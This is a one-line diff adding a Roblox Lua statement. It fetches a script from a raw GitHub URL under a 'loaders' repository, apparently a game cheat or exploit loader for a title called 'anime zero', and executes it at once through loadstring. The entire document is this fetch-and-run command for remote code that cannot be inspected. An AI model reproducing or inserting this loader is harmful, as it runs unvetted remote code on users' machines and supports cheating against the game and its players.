@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/anime-zero-solar-radiance-spam6-ds60p6p2iwgxkx.lua"))()
